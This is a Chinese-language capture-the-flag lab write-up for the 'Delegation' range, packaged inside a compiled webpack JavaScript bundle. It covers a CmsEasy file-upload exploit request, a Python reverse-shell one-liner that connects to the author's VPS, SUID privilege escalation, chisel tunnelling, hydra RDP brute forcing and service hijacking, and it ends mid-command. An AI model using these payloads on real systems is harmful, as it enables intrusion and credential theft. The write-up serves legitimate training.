"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[9303],{37839:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>t,contentTitle:()=>c,default:()=>o,frontMatter:()=>r,metadata:()=>d,toc:()=>_});var s=a(85893),i=a(11151);const r={},c="Delegation",d={id:"Yunjing/major/Delegation",title:"Delegation",description:"Tags",source:"@site/docs/Yunjing/major/Delegation.md",sourceDirName:"Yunjing/major",slug:"/Yunjing/major/Delegation",permalink:"/Target-Machines-WriteUp/docs/Yunjing/major/Delegation",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Yunjing/major/Delegation.md",tags:[],version:"current",frontMatter:{},sidebar:"Yunjing_Sidebar",previous:{title:"Brute4Road",permalink:"/Target-Machines-WriteUp/docs/Yunjing/major/Brute4Road"},next:{title:"Initial",permalink:"/Target-Machines-WriteUp/docs/Yunjing/major/Initial"}},t={},_=[{value:"\u5165\u53e3\u70b9\u63a2\u6d4b",id:"\u5165\u53e3\u70b9\u63a2\u6d4b",level:2},{value:"\u5165\u53e3\u70b9 CmsEasy \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6784\u5efa Webshell",id:"\u5165\u53e3\u70b9-cmseasy-\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6784\u5efa-webshell",level:2},{value:"\u5165\u53e3\u70b9 \u53cd\u5f39 shell + \u6743\u9650\u7ef4\u6301",id:"\u5165\u53e3\u70b9-\u53cd\u5f39-shell--\u6743\u9650\u7ef4\u6301",level:2},{value:"\u5165\u53e3\u70b9 Suid \u63d0\u6743",id:"\u5165\u53e3\u70b9-suid-\u63d0\u6743",level:2},{value:"flag - 01",id:"flag---01",level:2},{value:"\u5165\u53e3\u70b9 \u5efa\u7acb\u4e2d\u8f6c\u67a2\u7ebd",id:"\u5165\u53e3\u70b9-\u5efa\u7acb\u4e2d\u8f6c\u67a2\u7ebd",level:2},{value:"\u5165\u53e3\u70b9 \u5185\u7f51\u4fe1\u606f\u641c\u96c6",id:"\u5165\u53e3\u70b9-\u5185\u7f51\u4fe1\u606f\u641c\u96c6",level:2},{value:"172.22.4.45 XIAORANG\\WIN19 RDP \u5bc6\u7801\u7206\u7834",id:"17222445-xiaorangwin19-rdp-\u5bc6\u7801\u7206\u7834",level:2},{value:"172.22.4.45 XIAORANG\\WIN19 Windows \u670d\u52a1\u63d0\u6743",id:"17222445-xiaorangwin19-windows-\u670d\u52a1\u63d0\u6743",level:2},{value:"flag - 02",id:"flag---02",level:2},{value:"172.22.4.45 XIAORANG\\WIN19 \u6293\u53d6\u57df\u5185\u4fe1\u606f",id:"17222445-xiaorangwin19-\u6293\u53d6\u57df\u5185\u4fe1\u606f",level:2},{value:"172.22.4.45 XIAORANG\\WIN19 \u975e\u7ea6\u675f\u59d4\u6d3e",id:"17222445-xiaorangwin19-\u975e\u7ea6\u675f\u59d4\u6d3e",level:2},{value:"172.22.4.45 XIAORANG\\WIN19 \u7968\u636e\u6587\u4ef6\u76f4\u63a5 DCSync",id:"17222445-xiaorangwin19-\u7968\u636e\u6587\u4ef6\u76f4\u63a5-dcsync",level:2},{value:"172.22.4.45 XIAORANG\\WIN19 \u5bfc\u5165\u7968\u636e\u76f4\u63a5 DCSync \u83b7\u53d6\u57df\u5185\u54c8\u5e0c",id:"17222445-xiaorangwin19-\u5bfc\u5165\u7968\u636e\u76f4\u63a5-dcsync-\u83b7\u53d6\u57df\u5185\u54c8\u5e0c",level:2},{value:"172.22.4.7 DC \u4f7f\u7528 Administrator \u54c8\u5e0c\u767b\u5f55 DC",id:"1722247-dc-\u4f7f\u7528-administrator-\u54c8\u5e0c\u767b\u5f55-dc",level:2},{value:"flag- 04",id:"flag--04",level:2},{value:"172.22.4.19 FILESERVER.xiaorang.lab \u57df\u5185\u6a2a\u5411",id:"17222419-fileserverxiaoranglab-\u57df\u5185\u6a2a\u5411",level:2},{value:"flag - 03",id:"flag---03",level:2}];function l(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,i.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"delegation",children:"Delegation"})}),"\n",(0,s.jsxs)(n.admonition,{type:"info",children:[(0,s.jsx)(n.p,{children:"Tags"}),(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Brute Force - RDP \u5bc6\u7801\u7206\u7834"}),"\n",(0,s.jsx)(n.li,{children:"Privilege Elevation - Linux suid \u7279\u6743\u6587\u4ef6"}),"\n",(0,s.jsx)(n.li,{children:"Privilege Elevation - Windows \u670d\u52a1\u914d\u7f6e\u7f3a\u9677\u63d0\u6743"}),"\n",(0,s.jsx)(n.li,{children:"Kerberos - Kerberos TGT \u7968\u636e\u5229\u7528"}),"\n",(0,s.jsx)(n.li,{children:"\u57df\u6e17\u900f - DCSync & RPC \u5f3a\u5236\u8ba4\u8bc1"}),"\n"]}),(0,s.jsx)(n.p,{children:"\u9776\u6807\u4ecb\u7ecd"}),(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"Delegation \u662f\u4e00\u5957\u96be\u5ea6\u4e3a\u4e2d\u7b49\u7684\u9776\u573a\u73af\u5883\uff0c\u5b8c\u6210\u8be5\u6311\u6218\u53ef\u4ee5\u5e2e\u52a9\u73a9\u5bb6\u4e86\u89e3\u5185\u7f51\u6e17\u900f\u4e2d\u7684\u4ee3\u7406\u8f6c\u53d1\u3001\u5185\u7f51\u626b\u63cf\u3001\u4fe1\u606f\u6536\u96c6\u3001\u7279\u6743\u63d0\u5347\u4ee5\u53ca\u6a2a\u5411\u79fb\u52a8\u6280\u672f\u65b9\u6cd5\uff0c\u52a0\u5f3a\u5bf9\u57df\u73af\u5883\u6838\u5fc3\u8ba4\u8bc1\u673a\u5236\u7684\u7406\u89e3\uff0c\u4ee5\u53ca\u638c\u63e1\u57df\u73af\u5883\u6e17\u900f\u4e2d\u4e00\u4e9b\u6709\u8da3\u7684\u6280\u672f\u8981\u70b9\u3002\u8be5\u9776\u573a\u5171\u6709 4 \u4e2a flag\uff0c\u5206\u5e03\u4e8e\u4e0d\u540c\u7684\u9776\u673a\u3002"}),"\n"]})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="\u5165\u53e3\u70b9"',children:"39.99.241.120\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\u5165\u53e3\u70b9\u63a2\u6d4b",children:"\u5165\u53e3\u70b9\u63a2\u6d4b"}),"\n",(0,s.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"fscan"})," \u5bf9\u5165\u53e3\u70b9\u9776\u673a\u8fdb\u884c\u626b\u63cf"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"start infoscan\n39.99.241.120:80 open\n39.99.241.120:21 open\n39.99.241.120:22 open\n39.99.241.120:3306 open\n[*] alive ports len is: 4\nstart vulscan\n[*] WebTitle http://39.99.241.120      code:200 len:68108  title: \u4e2d\u6587\u7f51\u9875\u6807\u9898\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\u5165\u53e3\u70b9-cmseasy-\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6784\u5efa-webshell",children:"\u5165\u53e3\u70b9 CmsEasy \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6784\u5efa Webshell"}),"\n",(0,s.jsxs)(n.p,{children:["\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\uff0c\u53d1\u73b0\u5b58\u5728\u6709 ",(0,s.jsx)(n.code,{children:"/admin/"})," \u540e\u53f0\u767b\u9646\u754c\u9762\uff0c\u7ecf\u8fc7\u624b\u52a8\u5c1d\u8bd5\uff0c\u786e\u8ba4\u51ed\u636e\u4e3a\u5f31\u5bc6\u7801 ",(0,s.jsx)(n.code,{children:"admin:123456"})]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:a(69277).Z+"",width:"2559",height:"1371"})}),"\n",(0,s.jsxs)(n.p,{children:["\u6839\u636e\u9875\u9762\u5e95\u90e8\u7684 ",(0,s.jsx)(n.code,{children:"Powered by CmsEasy"})," \u5b57\u6bb5\uff0c\u641c\u7d22\u53ef\u80fd\u7684\u6f0f\u6d1e\u4fe1\u606f\uff0c\u7ed3\u5408\u53ef\u4ee5\u767b\u9646\u540e\u53f0\uff0c\u53ef\u4ee5\u786e\u8ba4\u8981\u5229\u7528\u7684\u6f0f\u6d1e\u4e3a\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"]}),"\n",(0,s.jsxs)(n.p,{children:["\u53c2\u8003\uff1a",(0,s.jsx)(n.a,{href:"https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD",children:"CmsEasy_7.7.5_20211012 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5199\u5165\u548c\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e | jdr"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"POST /index.php?case=template&act=save&admin_dir=admin&site=default HTTP/1.1\nHost: 39.99.237.127\nAccept-Language: zh-CN\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nCookie: PHPSESSID=i6o38uig1s56o0j0u8diitem0h; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 69\n\nsid=#data_d_.._d_.._d_.._d_1.php&slen=693&scontent=<?php phpinfo();?>\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:a(73944).Z+"",width:"2378",height:"1390"})}),"\n",(0,s.jsxs)(n.p,{children:["\u8bbf\u95ee ",(0,s.jsx)(n.code,{children:"http://39.99.237.127/1.php"})," \u9875\u9762\uff0c\u6210\u529f\u770b\u5230 phpinfo \u754c\u9762\uff0c\u8bf4\u660e\u53ef\u4ee5\u501f\u6b64\u5199\u5165 webshell"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:a(96537).Z+"",width:"1714",height:"1040"})}),"\n",(0,s.jsx)(n.h2,{id:"\u5165\u53e3\u70b9-\u53cd\u5f39-shell--\u6743\u9650\u7ef4\u6301",children:"\u5165\u53e3\u70b9 \u53cd\u5f39 shell + \u6743\u9650\u7ef4\u6301"}),"\n",(0,s.jsx)(n.p,{children:"\u57fa\u4e8e webshell\uff0c\u53cd\u5f39 shell \u5230 vps"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root@jmt-projekt:~# nc -lvnp 9999\nListening on 0.0.0.0 9999\nConnection received on 39.99.237.127 43980\nwhoami\nwww-data\npython3 --version\nPython 3.8.10\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u9274\u4e8e\u5b58\u5728\u6709 Python \u73af\u5883\uff0c\u4f7f\u7528 python \u7684\u53cd\u5f39 shell \u8fdb\u4e00\u6b65\u83b7\u53d6\u5b8c\u6210 shell \u529f\u80fd"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="netcat listener"',children:'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("139.*.*.*",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")\'\n'})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="pwncat-cs listener"',children:"root@jmt-projekt:~# pwncat-cs -lp 8888\n[08:25:49] Welcome to pwncat \ud83d\udc08!                                                                                                                                                                 __main__.py:164\n[08:26:19] received connection from 39.99.237.127:39390                                                                                                                                               bind.py:84\n[08:26:21] 0.0.0.0:8888: upgrading from /usr/bin/dash to /usr/bin/bash                                                                                                                            manager.py:957\n[08:26:22] 39.99.237.127:39390: registered new host w/ db                                                                                                                                         manager.py:957\n(local) pwncat$ back\n(remote) www-data@localhost:/var/www/html$ whoami\nwww-data\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\u5165\u53e3\u70b9-suid-\u63d0\u6743",children:"\u5165\u53e3\u70b9 Suid \u63d0\u6743"}),"\n",(0,s.jsx)(n.p,{children:"\u5bf9 suid \u7279\u6743\u6587\u4ef6\u8fdb\u884c\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@localhost:/$ find / -perm -u=s -type f 2>/dev/null\n/usr/bin/stapbpf\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/bin/su\n/usr/bin/chsh\n/usr/bin/staprun\n/usr/bin/at\n/usr/bin/diff\n/usr/bin/fusermount\n/usr/bin/sudo\n/usr/bin/mount\n/usr/bin/newgrp\n/usr/bin/umount\n/usr/bin/passwd\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u53d1\u73b0 ",(0,s.jsx)(n.code,{children:"/usr/bin/diff"})," \u7ed3\u5408 suid \u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"]}),"\n",(0,s.jsx)(n.p,{children:"\u540c\u65f6\u53d1\u73b0 flag \u6587\u4ef6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@localhost:/$ ls -lh /home/flag/\ntotal 4.0K\n-r-------- 1 root root 798 Jul 24 08:14 flag01.txt\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5c31\u53ef\u4ee5\u76f4\u63a5\u501f\u52a9 ",(0,s.jsx)(n.code,{children:"/usr/bin/diff --line-format=%L /dev/null /home/flag/flag01.txt"})," \u6765\u5bf9 ",(0,s.jsx)(n.code,{children:"flag01.txt"})," \u8fdb\u884c\u8bfb\u53d6"]}),"\n",(0,s.jsx)(n.h2,{id:"flag---01",children:"flag - 01"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:'  ____  U _____ u  _     U _____ u   ____      _       _____             U  ___ u  _   _\n |  _"\\ \\| ___"|/ |"|    \\| ___"|/U /"___|uU  /"\\  u  |_ "_|     ___     \\/"_ \\/ | \\ |"|\n/| | | | |  _|"U | | u   |  _|"  \\| |  _ / \\/ _ \\/     | |      |_"_|    | | | |<|  \\| |>\nU| |_| |\\| |___  \\| |/__  | |___   | |_| |  / ___ \\    /| |\\      | | .-,_| |_| |U| |\\  |u\n |____/ u|_____|  |_____| |_____|   \\____| /_/   \\_\\  u |_|U    U/| |\\u\\_)-\\___/  |_| \\_|\n  |||_   <<>>  //  \\\\  <<   >>   _)(|_   \\\\    >>  _// \\\\_.-,_|___|_,-.  \\\\    ||   \\\\,-.\n (__)_) (__) (__)(_")("_)(__) (__) (__)__) (__)  (__)(__) (__)\\_)-\'\'-(_/  (__)   (_")  (_/\n\nflag01: flag{54bbe683-5e1d-4e18-96c3-724db360b28b}\n\nGreat job!!!!!!\n\nHere is the hint: WIN19\\Adrian\n\nI\'ll do whatever I can to rock you...\n'})}),"\n",(0,s.jsx)(n.h2,{id:"\u5165\u53e3\u70b9-\u5efa\u7acb\u4e2d\u8f6c\u67a2\u7ebd",children:"\u5165\u53e3\u70b9 \u5efa\u7acb\u4e2d\u8f6c\u67a2\u7ebd"}),"\n",(0,s.jsxs)(n.p,{children:["\u501f\u52a9 ",(0,s.jsx)(n.code,{children:"pwncat-cs"})," \u7684\u6587\u4ef6\u4e0a\u4f20\u80fd\u529b\uff0c\u4e0a\u4f20 ",(0,s.jsx)(n.code,{children:"chisel_1.9.1_linux_amd64"})," \u4e4b\u540e\uff0c\u5efa\u7acb\u4ee3\u7406\u96a7\u9053"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="vps 139.*.*.*"',children:"root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse\n2024/07/24 08:45:56 server: Reverse tunnelling enabled\n2024/07/24 08:45:56 server: Fingerprint 2YUi1QXviZmFSEGJIEb3uN4KxK+uVWmTtTH0LIaylDo=\n2024/07/24 08:45:56 server: Listening on http://0.0.0.0:1337\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="\u5165\u53e3\u70b9 39.99.241.120"',children:"(remote) www-data@localhost:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 R:0.0.0.0:10001:socks &\n[1] 3352\n2024/07/24 08:46:44 client: Connecting to ws://139.*.*.*:1337\n2024/07/24 08:46:44 client: Connected (Latency 43.547056ms)\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6210\u529f\u5efa\u7acb\u8fde\u63a5"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="vps 139.*.*.*"',children:"2024/07/24 08:46:44 server: session#1: tun: proxy#R:10001=>socks: Listening\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\u5165\u53e3\u70b9-\u5185\u7f51\u4fe1\u606f\u641c\u96c6",children:"\u5165\u53e3\u70b9 \u5185\u7f51\u4fe1\u606f\u641c\u96c6"}),"\n",(0,s.jsxs)(n.p,{children:["\u4e0a\u4f20 ",(0,s.jsx)(n.code,{children:"fscan"})," \u8fdb\u884c\u5185\u7f51\u626b\u63cf"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@localhost:/tmp$ ifconfig\neth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 172.22.4.36  netmask 255.255.0.0  broadcast 172.22.255.255\n        inet6 fe80::216:3eff:fe1b:be8a  prefixlen 64  scopeid 0x20<link>\n        ether 00:16:3e:1b:be:8a  txqueuelen 1000  (Ethernet)\n        RX packets 89638  bytes 124109416 (124.1 MB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 21827  bytes 7117035 (7.1 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 678  bytes 59169 (59.1 KB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 678  bytes 59169 (59.1 KB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n(remote) www-data@localhost:/tmp$ ./fscan_amd64.1 -h 172.22.4.36/24\n......\nstart ping\n(icmp) Target 172.22.4.7      is alive\n(icmp) Target 172.22.4.19     is alive\n(icmp) Target 172.22.4.36     is alive\n(icmp) Target 172.22.4.45     is alive\n[*] Icmp alive hosts len is: 4\n172.22.4.45:445 open\n172.22.4.19:445 open\n172.22.4.7:445 open\n172.22.4.45:139 open\n172.22.4.19:139 open\n172.22.4.7:139 open\n172.22.4.45:135 open\n172.22.4.7:135 open\n172.22.4.19:135 open\n172.22.4.45:80 open\n172.22.4.36:80 open\n172.22.4.7:88 open\n172.22.4.36:3306 open\n172.22.4.36:22 open\n172.22.4.36:21 open\n[*] alive ports len is: 15\nstart vulscan\n[*] NetInfo:\n[*]172.22.4.19\n   [->]FILESERVER\n   [->]172.22.4.19\n[*] NetInfo:\n[*]172.22.4.7\n   [->]DC01\n   [->]172.22.4.7\n[*] NetBios: 172.22.4.7      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393\n[*] NetBios: 172.22.4.45     XIAORANG\\WIN19\n[*] NetInfo:\n[*]172.22.4.45\n   [->]WIN19\n   [->]172.22.4.45\n[*] 172.22.4.7  (Windows Server 2016 Datacenter 14393)\n[*] NetBios: 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393\n[*] WebTitle: http://172.22.4.36        code:200 len:68100  title: \u4e2d\u6587\u7f51\u9875\u6807\u9898\n[*] WebTitle: http://172.22.4.45        code:200 len:703    title:IIS Windows Server\n"})}),"\n",(0,s.jsx)(n.h2,{id:"17222445-xiaorangwin19-rdp-\u5bc6\u7801\u7206\u7834",children:"172.22.4.45 XIAORANG\\WIN19 RDP \u5bc6\u7801\u7206\u7834"}),"\n",(0,s.jsxs)(n.p,{children:["\u6839\u636e ",(0,s.jsx)(n.code,{children:"flag - 02"})," \u4e2d\u63d0\u4f9b\u7684\u4fe1\u606f"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"Here is the hint: WIN19\\Adrian\n\nI'll do whatever I can to rock you...\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u53ef\u4ee5\u786e\u5b9a\u7528\u6237\u4e3a ",(0,s.jsx)(n.code,{children:"WIN19\\Adrian"})," \u5e76\u4e14\u5bc6\u7801\u5b57\u5178\u4e3a ",(0,s.jsx)(n.code,{children:"rockyou.txt"})]}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u8fdb\u884c RDP \u7206\u7834"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ proxychains4 -q hydra -l "Adrian" -P /usr/share/wordlists/rockyou.txt rdp://172.22.4.45 -vV\n[ATTEMPT] target 172.22.4.45 - login "Adrian" - pass "babygirl1" - 219 of 14344399 [child 3] (0/0)\n[ERROR] freerdp: The password has expired and must be changed. (0x0002000e)\n[RE-ATTEMPT] target 172.22.4.45 - login "Adrian" - pass "babygirl1" - 223 of 14344399 [child 3] (0/0)\n[ERROR] freerdp: The password has expired and must be changed. (0x0002000e)\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u5f97\u5230\u4e00\u4e2a\u5bc6\u7801\u8fc7\u671f\u7684\u51ed\u636e ",(0,s.jsx)(n.code,{children:"Adrian:babygirl1"})]}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u8fde\u63a5"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:a(49172).Z+"",width:"2014",height:"1264"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5c1d\u8bd5\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"rdesktop"})," \u8fdb\u884c\u8fde\u63a5"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ proxychains4 rdesktop 172.22.4.45\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.4.45:3389  ...  OK\n\nATTENTION! The server uses and invalid security certificate which can not be trusted for\nthe following identified reasons(s);\n\n 1. Certificate issuer is not trusted by this system.\n\n     Issuer: CN=WIN19.xiaorang.lab\n\n\nReview the following certificate info before you trust it to be added as an exception.\nIf you do not trust the certificate the connection atempt will be aborted:\n\n    Subject: CN=WIN19.xiaorang.lab\n     Issuer: CN=WIN19.xiaorang.lab\n Valid From: Tue Jul 23 08:14:45 2024\n         To: Wed Jan 22 08:14:45 2025\n\n  Certificate fingerprints:\n\n       sha1: a06ec2425bc2cc6bcda14219c29eeea9535a4e60\n     sha256: b7edffe2d201fb98909e8463b077275ee0bfaaa3809851565cd3e25b421b2590\n\n\nDo you trust this certificate (yes/no)? yes\nFailed to initialize NLA, do you have correct Kerberos TGT initialized ?\n[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.4.45:3389  ...  OK\nCore(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.\nConnection established using SSL.\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:a(97181).Z+"",width:"2257",height:"1372"})}),"\n",(0,s.jsxs)(n.p,{children:["\u4fee\u6539\u5bc6\u7801\u4e3a ",(0,s.jsx)(n.code,{children:"Adrian:admin123"})," \u4e4b\u540e\uff0c\u5373\u53ef\u6210\u529f\u767b\u5f55"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:a(16417).Z+"",width:"2014",height:"1264"})}),"\n",(0,s.jsx)(n.h2,{id:"17222445-xiaorangwin19-windows-\u670d\u52a1\u63d0\u6743",children:"172.22.4.45 XIAORANG\\WIN19 Windows \u670d\u52a1\u63d0\u6743"}),"\n",(0,s.jsxs)(n.p,{children:["\u5728 ",(0,s.jsx)(n.code,{children:"C:\\Users\\Adrian\\Desktop\\PrivescCheck"})," \u684c\u9762\u4e0a\uff0c\u53d1\u73b0\u6709 ",(0,s.jsx)(n.code,{children:"PrivescCheck_WIN19.html"})," \u6587\u4ef6\uff0c\u4e5f\u5c31\u662f ",(0,s.jsx)(n.code,{children:"PrivescCheck"})," \u63d0\u6743\u68c0\u6d4b\u7684\u62a5\u544a"]}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u5176\u4e2d\u53d1\u73b0\u4e86\u4e00\u6761 High \u7ea7\u522b\u7684\u8bb0\u5f55"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:a(93963).Z+"",width:"2559",height:"1371"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:'Name              : gupdate\nImagePath         : "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe" /svc\nUser              : LocalSystem\nModifiablePath    : HKLM\\SYSTEM\\CurrentControlSet\\Services\\gupdate\nIdentityReference : BUILTIN\\Users\nPermissions       : WriteDAC, Notify, ReadControl, CreateLink, EnumerateSubKeys, WriteOwner, Delete, CreateSubKey, SetValue, QueryValue\nStatus            : Stopped\nUserCanStart      : True\nUserCanStop       : True\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u53ef\u4ee5\u501f\u52a9\u6b64\u8fd0\u884c msf \u751f\u6210\u7684\u9a6c"}),"\n",(0,s.jsxs)(n.admonition,{type:"warning",children:[(0,s.jsx)(n.p,{children:"\u5185\u7f51\u9776\u673a\u6ca1\u6709\u51fa\u7f51\u80fd\u529b\uff0c\u6240\u4ee5\u9700\u8981\u63d0\u524d\u8bbe\u7f6e\u597d\u5185\u7f51 -> \u5916\u7f51\u7684\u7aef\u53e3\u8f6c\u53d1"}),(0,s.jsx)(n.p,{children:"\u7531\u4e8e\u670d\u52a1\u8fd0\u884c\u7684\u6587\u4ef6\u5728\u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e\u4f1a\u81ea\u52a8\u505c\u6b62\uff0c\u6240\u4ee5\u5728\u5efa\u7acb c2 \u8fde\u63a5\u4e4b\u540e\uff0c\u5e94\u53ca\u65f6\u8fdb\u884c\u8fdb\u7a0b\u8fc1\u79fb"})]}),"\n",(0,s.jsx)(n.p,{children:"\u5efa\u7acb\u5185\u7f51 -> \u5916\u7f51\u7684\u7aef\u53e3\u8f6c\u53d1"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="\u5165\u53e3\u70b9 172.22.4.36"',children:"(remote) www-data@localhost:/tmp$ ifconfig\neth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 172.22.4.36  netmask 255.255.0.0  broadcast 172.22.255.255\n        inet6 fe80::216:3eff:fe1b:be8a  prefixlen 64  scopeid 0x20<link>\n        ether 00:16:3e:1b:be:8a  txqueuelen 1000  (Ethernet)\n        RX packets 166956  bytes 177580251 (177.5 MB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 79621  bytes 28563311 (28.5 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 15264  bytes 6538426 (6.5 MB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 15264  bytes 6538426 (6.5 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n(remote) www-data@localhost:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 7777:7777 &\n[2] 